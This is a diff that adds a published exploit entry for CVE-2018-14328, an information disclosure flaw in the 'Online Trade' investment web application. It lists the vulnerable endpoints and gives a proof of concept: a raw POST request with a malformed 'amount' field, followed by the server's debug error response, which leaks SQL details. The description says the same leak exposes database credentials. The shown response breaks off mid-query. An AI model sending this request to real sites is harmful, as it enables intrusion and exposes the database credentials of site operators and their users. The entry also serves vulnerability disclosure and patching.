@@ -1,0 +1,67 @@
+# Exploit Title: Online Trade 1 - Information Disclosure
+# Exploit Author: Dhamotharan
+# Date: 2018-07-17
+# Vendor Homepage: https://codecanyon.net/item/online-trade-online-forex-and-cryptocurrency-investment-system/21987193?s_rank=14
+# CVE : CVE-2018-14328
+# Version: 1
+# Tested on: Kali Linux
+
+# Description :
+# Brynamics "Online Trade - Online trading and cryptocurrency investment
+# system" allows remote attackers to obtain sensitive information via a
+# direct request for /dashboard/addplan, /dashboard/paywithcard/charge,
+# /dashboard/withdrawal, or /privacy&terms,
+# as demonstrated by reading database username, database password,
+# database_name, and IP address.
+
+# POC:
+
+# Request:
+
+POST /dashboard/withdrawal HTTP/1.1
+Host: 127.0.0.1:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
+Trident/5.0)
+Connection: close
+Referer: http://127.0.0.1:8080/dashboard/withdrawals
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+Cookie:
+XSRF-TOKEN=eyJpdiI6IlAwSjE2SjE1REVUdTM0bXhsMDY1b3c9PSIsInZhbHVlIjoiN204
+d3RFcmdOSFVmTEo2cGh5bFlxY3RlR0p2U2hoN3NkNDZ5Vit3MjdpS3B2RHJG
+aVFZdzlKNmFyN25RbWJLRnZtT3FaTDVvbHV4Ym9HMmFiWlhGY0E9PSIsIm1h
+YyI6ImZmNTFhOGJkMmYxMTBlMGRjZDU4YzQ5MTI3NTljN2JiOGYyODc3MTEx
+YjhjMzFiZTNkNWMzZjc5YjVlYTUyODEifQ%3D%3D;
+laravel_session=eyJpdiI6IjZycklXVDNRTWsrT0NsZ3A2ZnIrWFE9PSIsInZhbHVlIjoiRzdC
+VlJzXC81VWdSWHlkSys2K3dtR2h3UnpzZzhjT1wvdDZtZ3BOMXpjU09SMTJD
+TGdXeEhSWkhadGt0RnhPRDR3MWZreXlLOTA1RDNIQStIZFpxRG5OZz09Iiwi
+bWFjIjoiNTkwYzU3ZGMxOTg3NWU1ZWFjNjVjNjNkN2VjODkzYTBjZDI3MTAx
+NWJmZTUzN2VhZDRlNzEyMDcyODk5ZmFlZiJ9;
+__tawkuuid=e::trade.brynamics.xyz::3PC5vtdJoz40C7aJUDGFFuGkOrICf1
+3gr5+ReA6AWqfUvhPDsTAf982UcNP+u5nq::2;
+TawkConnectionTime=0
+
+amount=555-555-0199@example.com
+&payment_mode=Bitcoin&method_id=2&_token=
+VG4OwJ1Dxx0kDSA3JCp0JtHDMX3TI5WpXE6nTDWi
+
+# Response:
+
+HTTP/1.1 500 Internal Server Error
+Date: Mon, 16 Jul 2018 11:14:58 GMT
+Server: Apache
+X-Powered-By: PHP/7.0.30
+Cache-Control: no-cache, private
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 708733
+<!DOCTYPE html><!--
+Illuminate\Database\QueryException: SQLSTATE[22001]: String data, right
+truncated: 1406 Data too long for column &#039;amount&#039; at row
+1 (SQL:
+insert into `withdrawals` (`amount`, `to_deduct`, `payment_mode`, `status`,
+`user`, `updated_at`, `created_at`) values (555-555-0199@example.com,
+620.5, Bitcoin, Pending, 182, 2018-07-16 11:14:59, 2018-07-16 11:14:59)) in
